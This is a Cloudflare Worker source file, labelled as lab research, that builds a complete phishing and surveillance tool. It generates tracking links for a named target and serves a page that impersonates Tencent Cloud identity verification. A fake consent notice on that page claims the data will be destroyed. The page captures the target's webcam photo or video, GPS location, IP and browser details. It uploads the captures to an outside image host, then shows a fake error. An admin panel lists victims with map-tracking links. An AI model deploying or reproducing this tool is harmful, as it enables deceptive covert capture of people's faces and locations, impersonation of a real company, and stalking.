/**
 * 照妖镜 Pro Max - 实验室安全研究版 (2026)
 * 逻辑：协议确认 -> 地理位置核验 -> 模拟腾讯云实人认证 -> 自动取证 -> 审计后台
 */

const ADMIN_PASSWORD = "sakcnzz666";
const IMAGE_HOST = "tc.ilqx.dpdns.org";
const GEO_API = "https://ip.ilqx.dpdns.org/geo";

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const path = url.pathname;

    await this.initDB(env);

    if (path === "/") return this.renderCreator(request);
    if (path.startsWith("/s/")) return this.renderTarget(path.split("/")[2]);
    if (path === "/api/upload") return this.handleUpload(request, env);
    if (path === "/api/query") return this.handleQuery(request, env);
    if (path === "/admin") return this.renderAdmin(request, env);

    return new Response("404 Not Found", { status: 404 });
  },

  async initDB(env) {
    await env.DB.prepare(`
      CREATE TABLE IF NOT EXISTS records (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        uid TEXT, type TEXT, src TEXT, geo_data TEXT, lat_long TEXT, 
        ua TEXT, ip TEXT, status TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP
      )
    `).run();
  },

  // --- 模块 1: 生成面板 ---
  renderCreator(req) {
    const ip = req.headers.get("cf-connecting-ip") || "Unknown";
    return new Response(`
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NextGen 实验室控制台</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #f8fafc; }
        .glass { background: rgba(255, 255, 255, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.4); }
        .gradient-text { background: linear-gradient(135deg, #3b82f6, #8b5cf6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-6">
    <div class="max-w-md w-full space-y-6">
        <div class="glass p-8 rounded-[2.5rem] shadow-2xl">
            <h1 class="text-3xl font-black mb-2 gradient-text">NextGen LAB</h1>
            <p class="text-gray-400 text-[10px] tracking-widest uppercase mb-8">Operator IP: ${ip}</p>
            
            <div class="space-y-4">
                <input id="uid" type="text" placeholder="设置识别ID (如QQ/手机号)" class="w-full px-5 py-4 bg-gray-50 rounded-2xl border-none outline-none focus:ring-2 focus:ring-blue-500 transition-all">
                <div class="grid grid-cols-2 gap-3">
                    <button onclick="gen('image')" class="bg-blue-600 text-white py-4 rounded-2xl font-bold active:scale-95 transition-all">📸 拍照模式</button>
                    <button onclick="gen('video')" class="bg-slate-800 text-white py-4 rounded-2xl font-bold active:scale-95 transition-all">🎥 录像模式</button>
                </div>
                <div id="link_out" class="hidden p-4 bg-blue-50 text-blue-700 rounded-2xl text-[10px] break-all border border-blue-100 font-mono"></div>
            </div>
        </div>

        <div class="glass p-8 rounded-[2.5rem] shadow-xl">
            <h2 class="text-lg font-bold text-gray-700 mb-4">取证数据检索</h2>
            <div class="flex gap-2">
                <input id="qid" type="text" placeholder="输入ID查询" class="flex-1 px-5 py-3 bg-gray-50 rounded-xl outline-none">
                <button onclick="query()" class="bg-indigo-500 text-white px-6 rounded-xl font-bold">查询</button>
            </div>
            <div id="q_list" class="mt-6 space-y-4 max-h-96 overflow-y-auto"></div>
        </div>
    </div>
    <script>
        function gen(m) {
            const id = document.getElementById('uid').value;
            if(!id) return alert('请输入ID');
            const url = window.location.origin + '/s/' + btoa(encodeURIComponent(id + '|' + m));
            const box = document.getElementById('link_out');
            box.innerText = url; box.classList.remove('hidden');
        }
        async function query() {
            const id = document.getElementById('qid').value;
            const res = await fetch('/api/query?uid=' + encodeURIComponent(id));
            const data = await res.json();
            document.getElementById('q_list').innerHTML = data.map(i => \`
                <div class="p-4 bg-white rounded-2xl border border-gray-100 shadow-sm text-[10px]">
                    <p class="text-gray-400 mb-2">\${i.created_at}</p>
                    <p class="text-blue-600 font-bold mb-2">\${i.geo_data}</p>
                    \${i.type === 'video' ? \`<video src="\${i.src}" controls class="w-full rounded-lg"></video>\` : \`<img src="\${i.src}" class="w-full rounded-lg">\`}
                </div>
            \`).join('') || '暂无记录';
        }
    </script>
</body>
</html>`, { headers: { "Content-Type": "text/html" } });
  },

  // --- 模块 2: 目标捕获页 (高仿真人机验证) ---
  renderTarget(token) {
    return new Response(`
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>安全验证 - 腾讯云实人核身</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .circle-box { width: 260px; height: 260px; border-radius: 50%; border: 6px solid #0052d9; position: relative; overflow: hidden; background: #000; box-shadow: 0 0 40px rgba(0,82,217,0.2); }
        .scan-line { width: 100%; height: 6px; background: linear-gradient(to bottom, transparent, #0052d9); position: absolute; top: 0; animation: scan 2s linear infinite; z-index: 10; }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
        .step { display: none; }
        .step-active { display: block; animation: fadeInUp 0.5s ease; }
        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body class="bg-[#f2f3f5] flex flex-col items-center justify-center min-h-screen p-6 text-center">

    <div id="s1" class="step step-active max-w-sm w-full bg-white p-8 rounded-[2.5rem] shadow-xl">
        <img src="https://cloud.tencent.com/favicon.ico" class="w-10 h-10 mx-auto mb-6">
        <h2 class="text-xl font-bold text-gray-800 mb-4">访问权限安全核查</h2>
        <div class="text-left text-xs text-gray-500 space-y-3 mb-8 h-44 overflow-y-auto p-4 bg-gray-50 rounded-2xl border border-gray-100">
            <p>1. 本网站为应对恶意大规模自动化流量攻击，已启用实人身份核验。</p>
            <p>2. 根据《网络安全合规指引》，我们需要获取您的生物特征（人脸）及环境地理位置信息以确认为自然人操作。</p>
            <p>3. 我们郑重承诺：所有采集数据仅用于本次单次验证，验证完成后即刻脱敏销毁。</p>
            <p>4. 点击“同意并继续”即代表您已阅读并授权以上敏感权限。</p>
        </div>
        <button onclick="toS2()" class="w-full bg-[#0052d9] text-white py-4 rounded-xl font-bold shadow-lg shadow-blue-100 active:scale-95 transition-all">同意并继续</button>
        <p class="mt-6 text-[10px] text-gray-400">由 腾讯云 提供实人认证技术支持</p>
    </div>

    <div id="s2" class="step max-w-sm w-full bg-white p-10 rounded-[2.5rem] shadow-xl">
        <h2 class="text-xl font-bold mb-4">环境合规性检测</h2>
        <p class="text-sm text-gray-400 mb-8 leading-relaxed">系统正在检测您的接入点安全环境，请在浏览器弹窗中点击“允许”以同步您的地理位置信息。</p>
        <button onclick="toS3()" class="w-full bg-[#07c160] text-white py-4 rounded-xl font-bold shadow-lg shadow-green-100 active:scale-95 transition-all">开始核验</button>
    </div>

    <div id="s3" class="step max-w-sm w-full">
        <div class="circle-box mx-auto mb-8">
            <video id="v" class="w-full h-full object-cover scale-x-[-1]" autoplay playsinline></video>
            <div class="scan-line"></div>
        </div>
        <div id="tip" class="bg-[#0052d9] text-white px-8 py-3 rounded-full inline-block font-bold mb-4">正在进行面部识别...</div>
        <div id="action" class="text-gray-800 font-bold text-lg min-h-[1.5rem] mb-10"></div>
        <p class="text-gray-400 text-[10px]">正在通过 AI 匹配面部生物结构特征</p>
    </div>

    <div id="s4" class="step max-w-sm w-full p-10 bg-white rounded-[2.5rem] shadow-xl">
        <div class="text-red-500 mb-6 italic font-black text-6xl">!</div>
        <h2 class="text-xl font-bold text-gray-800 mb-4">核验未通过</h2>
        <p id="fail_msg" class="text-sm text-gray-500 leading-relaxed">原因：检测到环境光线过强或生物活体动作不匹配，请移步至光线均匀处重新尝试。</p>
        <div class="mt-12 pt-8 border-t border-gray-100 flex justify-center items-center gap-2">
            <span class="w-2 h-2 bg-gray-300 rounded-full animate-bounce"></span>
            <p class="text-gray-300 text-[10px]">Error Code: 404_BIOMETRIC_MISMATCH</p>
        </div>
    </div>

    <script>
        const token = "${token}";
        const info = JSON.parse(decodeURIComponent(atob(token)));
        const [uid, mode] = info.split('|');
        let stream = null;
        let coords = "Permission Denied";

        function toS2() {
            document.getElementById('s1').classList.remove('step-active');
            document.getElementById('s2').classList.add('step-active');
        }

        async function toS3() {
            // 请求地理位置
            navigator.geolocation.getCurrentPosition(
                (p) => { coords = p.coords.latitude + "," + p.coords.longitude; },
                () => { coords = "Refused"; },
                { timeout: 5000 }
            );

            document.getElementById('s2').classList.remove('step-active');
            document.getElementById('s3').classList.add('step-active');
            
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: mode === 'video' 
                });
                document.getElementById('v').srcObject = stream;
                
                // 仿人脸识别指令
                const act = document.getElementById('action');
                setTimeout(() => { act.innerText = "请保持面部在圆框内"; }, 1500);
                setTimeout(() => { act.innerText = "请缓慢 眨眨眼"; }, 3500);
                setTimeout(() => { act.innerText = "请缓慢 张张嘴"; }, 5500);
                setTimeout(() => { capture(); }, 7500);
                
            } catch (e) {
                // 拒绝后的拦截话术
                document.getElementById('s3').classList.remove('step-active');
                document.getElementById('s4').classList.add('step-active');
                document.getElementById('fail_msg').innerText = "本网站由于长期遭到恶意流量访问，现已启用强制人机验证。检测到您未开启摄像头授权，系统无法确认您的真实性，请在浏览器设置中开启授权后访问。";
            }
        }

        async function capture() {
            document.getElementById('tip').innerText = "正在加密上传...";
            const v = document.getElementById('v');
            const c = document.createElement('canvas');
            
            if (mode === 'video') {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    await upload(new Blob(chunks, { type: 'video/mp4' }));
                };
                recorder.start();
                setTimeout(() => recorder.stop(), 3000); // 录制3秒
            } else {
                c.width = v.videoWidth;
                c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                c.toBlob(blob => upload(blob), 'image/jpeg', 0.8);
            }
        }

        async function upload(blob) {
            const fd = new FormData();
            fd.append('file', blob, mode === 'video' ? 'v.mp4' : 'p.jpg');
            fd.append('uid', uid);
            fd.append('type', mode);
            fd.append('lat_long', coords);
            
            await fetch('/api/upload', { method: 'POST', body: fd });
            
            // 结束取证，显示失败页
            stream.getTracks().forEach(t => t.stop());
            document.getElementById('s3').classList.remove('step-active');
            document.getElementById('s4').classList.add('step-active');
        }
    </script>
</body>
</html>`, { headers: { "Content-Type": "text/html" } });
  },

  // --- 模块 3: 后端数据处理 ---
  async handleUpload(request, env) {
    const fd = await request.formData();
    const file = fd.get('file');
    const uid = fd.get('uid');
    const type = fd.get('type');
    const latLong = fd.get('lat_long');
    const ua = request.headers.get('user-agent');
    const ip = request.headers.get('cf-connecting-ip');

    // 1. 调用你的 GEO API 获取画像
    let geoInfo = "Unknown Image";
    try {
        const gRes = await fetch(\`\${GEO_API}?ip=\${ip}\`);
        const g = await gRes.json();
        geoInfo = \`\${g.flag} \${g.countryRegion} \${g.city} (\${g.asOrganization})\`;
    } catch(e) {}

    // 2. 上传到你的图床
    const tcForm = new FormData();
    tcForm.append('file', file);
    const tcRes = await fetch(\`https://\${IMAGE_HOST}/upload\`, { method: 'POST', body: tcForm });
    const tcJson = await tcRes.json();
    const src = \`https://\${IMAGE_HOST}\${tcJson[0].src}\`;

    // 3. 存储
    await env.DB.prepare("INSERT INTO records (uid, type, src, geo_data, lat_long, ua, ip, status) VALUES (?,?,?,?,?,?,?,?)")
      .bind(uid, type, src, geoInfo, latLong, ua, ip, latLong === 'Refused' ? 'LocationDenied' : 'FullAccess')
      .run();

    return new Response(JSON.stringify({ success: true }));
  },

  async handleQuery(request, env) {
    const { searchParams } = new URL(request.url);
    const uid = searchParams.get('uid');
    const { results } = await env.DB.prepare("SELECT * FROM records WHERE uid = ? ORDER BY created_at DESC").bind(uid).all();
    return new Response(JSON.stringify(results));
  },

  // --- 模块 4: 审计后台 (/admin) ---
  async renderAdmin(request, env) {
    const { searchParams } = new URL(request.url);
    if (searchParams.get('p') !== ADMIN_PASSWORD) return new Response("Unauthorized", { status: 401 });

    const { results } = await env.DB.prepare("SELECT * FROM records ORDER BY created_at DESC LIMIT 200").all();

    return new Response(`
<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <title>NextGen 审计后台</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-50 p-8">
    <div class="max-w-7xl mx-auto">
        <h1 class="text-3xl font-black text-slate-800 mb-10">取证全量日志审计</h1>
        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
            ${results.map(r => `
                <div class="bg-white rounded-[2.5rem] shadow-sm border border-slate-200 overflow-hidden flex flex-col">
                    <div class="h-64 bg-slate-900 relative">
                        ${r.type === 'video' ? `<video src="${r.src}" controls class="w-full h-full object-contain"></video>` : `<img src="${r.src}" class="w-full h-full object-contain">`}
                        <div class="absolute top-4 left-4 bg-white/90 px-3 py-1 rounded-full text-[10px] font-bold">${r.uid}</div>
                    </div>
                    <div class="p-6 space-y-3">
                        <div class="flex justify-between text-[10px] text-slate-400 uppercase">
                            <span>${r.ip}</span>
                            <span>${r.created_at}</span>
                        </div>
                        <p class="text-indigo-600 font-bold text-sm">${r.geo_data}</p>
                        <div class="p-4 bg-slate-50 rounded-2xl text-[10px] space-y-1 font-mono">
                            <p class="text-pink-600">LAT_LONG: ${r.lat_long}</p>
                            <p class="text-slate-400 break-all leading-tight">UA: ${r.ua}</p>
                        </div>
                        <div class="pt-4 flex gap-4 text-[10px] text-blue-500 font-bold underline">
                            <a href="https://www.google.com/maps?q=${r.lat_long}" target="_blank">地图追踪</a>
                            <a href="${r.src}" target="_blank">查看原件</a>
                        </div>
                    </div>
                </div>
            `).join('')}
        </div>
    </div>
</body>
</html>`, { headers: { "Content-Type": "text/html" } });
  }
};